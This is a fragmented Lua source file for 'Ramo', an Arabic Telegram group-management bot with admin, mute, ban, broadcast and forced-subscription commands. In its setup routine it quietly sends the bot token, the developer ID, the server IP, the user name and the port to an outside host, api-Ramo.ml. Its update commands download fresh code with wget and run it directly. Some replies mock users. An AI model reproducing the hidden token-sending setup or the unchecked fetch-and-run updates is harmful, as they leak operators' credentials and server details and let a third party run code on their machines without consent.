...
os.execute('lua RaMo.lua')
end
if not database:get(Server.."UserSudo_Write") then
print("\27[1;34mارسل ايدي المطور الان :\27[m")
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://api-Ramo.ml/Ramo/index.php?Ban=Ramo&Info&Id="..Id)
if res == 200 then
...
https.request("https://api-Ramo.ml/Ramo/index.php?Get=Ramo&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::Ramo::")
local RunRamo = io.open("Ramo", 'w')
RunRamo:write([[
#!/usr/bin/env bash
cd $HOME/Ramo
token="]]..database:get(Server.."Token_Write")..[["
...
./tg -s ./RaMo.lua -p PROFILE --bot=$token
done
]])
RunRamo:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Ramo -X kill
screen -S Ramo ./Ramo
done
]])
RunWtN:close()
io.popen("mkdir File_Bot") 
os.execute('chmod +x Ramo;sudo chmod +x ./WtN;./WtN')
end
Files_Info_Get()
end 
...
local hash = database:sismember(bot_id.."Dev:Ramo:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevRamo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevRamo(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif database:sismember(bot_id.."Dev:Ramo:2", user_id) then
var = true  
...
if database:sismember(bot_id..'Ramo:ProGroups',msg.chat_id_) then
var = true
else
...
Ramo_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Ramo_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Ramo_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Ramo_Msg = 'امبروطور التفاعل' 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 Ramo.")  
...
if File_Name ~= "RaMo.lua" then 
send(chat,msg.id_," ✯︙هذا الملف غير تابع لسورس رامو")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
...
if text == '/start' then  
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
...
SourceRamor = '✯︙اهلا عزيزي\n✯︙انا بوت اسمي '..(database:get(bot_id..'Name:Bot') or 'رامو')..'\n✯︙اختصاصي حمايه الكروبات\n✯︙من تكرار والسبام والتوجيه والخ…\n✯︙لتفعيلي اتبع الاخطوات…↓\n✯︙اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط'
end 
send(msg.chat_id_, msg.id_, SourceRamor) 
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,60,true)
return false
end
if not DevRamo(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
send(msg.chat_id_, msg.id_,Ramo_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل ✯' and DevRamo(msg) then  
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'تعطيل التواصل ✯' and DevRamo(msg) then  
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'ضع كليشه ستارت ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'حذف كليشه ستارت ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'معلومات السيرفر ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
os.execute('rm -rf RaMo.lua')
os.execute('wget https://raw.githubusercontent.com/T_O_Y_S/Ramo/main/RaMo.lua')
send(msg.chat_id_, msg.id_,'✯︙تم تحديث السورس \n✯︙لديك اخر اصدار لسورس رامو\n✯︙الاصدار » { v 2.8 }')
dofile('RaMo.lua')  
end

if text == 'مطور السورس ✯' and DevRamo(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙ان كان لديك استفسار او اي مشكلة\n✯︙يمكنك مراسلة مطور السورس\n✯︙حساب مطور السورس [اضـغـط هـنـا  𓆩•𝐀𝐁𝐁𝐀𝐒 𝐅𝐀𝐃𝐇𝐈𝐋•𓆪  ](t.me/Ramo41)')
end

if text == 'تحديث المتجر ✯' and DevRamo(msg) then 
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/T_O_Y_S/Files_Ramo/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/T_O_Y_S/Files_Ramo/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/T_O_Y_S/Files_Ramo/main/File_Bot/games.lua") 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙تم تنزيل جميع ملفات المتجر وتحديثه الى اخر اصدار\n✯︙تابعنا لتصلك اخر التحديثات\n✯︙[قناة السورس](t.me/T_O_Y_S)')
dofile('RaMo.lua')  
end
...
if text == 'المجموعات المدفوعه ✯' and DevRamo(msg) then
local List = database:smembers(bot_id.."Ramo:ProGroups")
local Ramo = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم '..os.date("%Y/%m/%d")..' \nٴ≪━━━━ Ramo ━━━━≫ٴ\n'
for k,v in pairs(List) do
local Ramogetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if Ramogetlink.ok == true then 
link_Ramo = '['..Ramogetlink.result..']'
else
link_Ramo = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
Ramo = Ramo..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."Ramo:ProGroups:Time"..v).."`) \n- "..link_Ramo.." \n" 
end
if #List == 0 then
Ramo = '✯︙لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,Ramo) 
end
if text == 'جلب ملف السورس ✯' then
if not DevRamo(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './RaMo.lua', '✯︙نسخة ملف سورس رامو')
end 
end
if (text == "تغير المطور الاساسي ✯") and msg.reply_to_message_id_ == 0 and DevRamo(msg) then 
...
if text == 'تفعيل الاذاعه ✯' and DevRamo(msg) then  
...
if text == 'تعطيل الاذاعه ✯' and DevRamo(msg) then  
...
if text == ("مسح المحظورين عام ✯") and DevRamo(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام ✯") and DevRamo(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح قائمه المكتومين عام')
return false
end
if text == 'الاصـدار ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✯︙اصدار سورس رامو \n✯︙الاصدار »{ v 2.8 }')
end
if text == "ضع اسم للبوت ✯" and DevRamo(msg) then  
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'الاحصائيات ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'المشتركين ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'الكروبات ✯' and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == ("الثانويين ✯") and DevRamo(msg) then
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
local list = database:smembers(bot_id..'Dev:Ramo:2')
t = "\n✯︙قائمة الثانويين \nٴ≪━━━━ Ramo ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "قناة التحديثات ✯" and DevRamo(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس رامو*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇Ramo 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/T_O_Y_S"}},
}
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("المحظورين عام ✯") and DevRamo(msg) then
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == ("قائمه الكتم العام ✯") and DevRamo(msg) then
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text=="اذاعه خاص ✯" and msg.reply_to_message_id_ == 0 and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text=="اذاعه ✯" and msg.reply_to_message_id_ == 0 and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text=="اذاعه بالتثبيت ✯" and msg.reply_to_message_id_ == 0 and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text=="اذاعه بالتوجيه ✯" and msg.reply_to_message_id_ == 0  and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text=="اذاعه بالتوجيه خاص ✯" and msg.reply_to_message_id_ == 0  and DevRamo(msg) then 
local url,res = https.request('https://abbas.T_O_Y_S.tk/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_T_O_Y_S ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @T_O_Y_S')   
...
if text == 'جلب نسخه الاحتياطيه ✯' and DevRamo(msg) then 
GetFile_Bot(msg)
end
...
send(msg.chat_id_, msg.id_,'✯︙عدد الكروبات الان » { '..#group..' }'..Ramok..''..Ramo..'\n✯︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
local Ramo1_Msg = database:get(bot_id.."Ramo1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Ramo1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'T_O_Y_S')..') \n✯︙'..Ramo1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if msg.content_.text_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'Ramo:ProGroups',v) then
send(v, 0,'['..msg.content_.text_..']')  
end
end
elseif msg.content_.photo_ then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Ramo_Msg and not Special(msg) then  
local Ramo_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Ramo_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n✯︙["..Ramo_Msg.."] \n")
else
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](t.me/T_O_Y_S)}\n✯︙["..Ramo_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✯︙عذرا » {["..data.first_name_.."](t.me/T_O_Y_S)}\n✯︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevRamo(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevRamo(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevRamo(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevRamo(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ✯" and DevRamo(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ✯︙تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ✯$") and DevRamo(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ✯" and DevRamo(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," ✯︙الاشتراك الاجباري مفعل \n✯︙على القناة » ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"✯︙اهلا عزيزي المطور \n✯︙ارفع البوت مشرف في قناتك \n✯︙ثم ارسل معرف قناتك\n✯︙مثال على معرف القناة @T_O_Y_S")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري ✯" and DevRamo(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ✯︙تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ✯" and DevRamo(msg) then  
...
database:set(bot_id.."AL:AddRamo:stats","✔")
end
...
local MRRamo = database:get(bot_id.."AL:AddRamo:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRRamo.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
...
database:sadd(bot_id.."Ramo:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Ramo:blocname"..msg.chat_id_)
...
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
...
if t2.id_ then 
name_MRRamo = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRRamo then 
names_MRRamo = database:smembers(bot_id.."Ramo:blocname"..msg.chat_id_) or ""
if names_MRRamo and names_MRRamo[1] then 
for i=1,#names_MRRamo do 
if name_MRRamo:match("(.*)("..names_MRRamo[i]..")(.*)") then 
...
database:set(bot_id.."Ramo:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Ramo:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Ramo:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Ramo:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'✯︙التوحيد '..s1..'\n✯︙عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Ramo:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function Ramo_mrRamo_new(mrRamo1,mrRamo2)
if mrRamo2 and mrRamo2.first_name_ then 
if mrRamo2.first_name_:match("(.*)"..database:get(bot_id.."Ramo:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Ramo:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrRamo_nnn = database:get(bot_id.."Ramo:nump"..msg.chat_id_) or 5
local mrRamo_nnn2 = database:get(bot_id.."Ramo:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrRamo_nnn2) == tonumber(mrRamo_nnn) or tonumber(mrRamo_nnn2) > tonumber(mrRamo_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Ramo:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✯︙عزيزي >>["..mrRamo2.username_.."](https://t.me/"..(mrRamo2.username_ or "T_O_Y_S")..")\n✯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Ramo:teh"..msg.chat_id_).."} بجانب اسمك\n✯︙عدد المحاولات المتبقيه {"..(tonumber(mrRamo_nnn) - tonumber(mrRamo_nnn2)).."}")
end
end
end
end
bnnaGet(id, Ramo_mrRamo_new)
end
end
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
...
local RamoChengName = database:get(bot_id.."Ramo:Cheng:Name"..data.id_)
if not data.first_name_ then 
if RamoChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..RamoChengName..']')
database:del(bot_id.."Ramo:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if RamoChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Ramo:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
...
if data.id_ then 
if data.id_ ~= bot_id then
local RamoChengUserName = database:get(bot_id.."Ramo:Cheng:UserName"..data.id_)
if not data.username_ then 
if RamoChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..RamoChengUserName..']')
database:del(bot_id.."Ramo:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if RamoChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Ramo:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddRamo:stats") == "✔" then
...
if data.id_ then 
if data.id_ ~= bot_id then 
local RamoChengPhoto = database:get(bot_id.."Ramo:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if RamoChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Ramo:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if RamoChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Ramo:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
Text = "[⦑ Welcome to Source ⦒](t.me/T_O_Y_S)\n[✯ ⦑ SOURCE Ramo ⦒](t.me/T_O_Y_S)\n✯ Source version : 2.8"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/T_O_Y_S"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/T_O_Y_S"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/T_O_Y_S/7"},
{text = 'Ramo 𝒈𝒓𝒐𝒖𝒑',url="https://t.me/Remove44"}},
{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/Ramo41"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/T_O_Y_S&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع ملف السورس' or text == 'رفع الملف' and DevRamo(msg) then   
...
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './File_Bot/Reply.lua', '✯︙ملف الردود الخاص بسورس رامو')
end 
end
if text == 'رفع نسخه الاحتياطيه' and DevRamo(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'T_O_Y_S')..') \n✯︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'T_O_Y_S')..') \n✯︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevRamo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
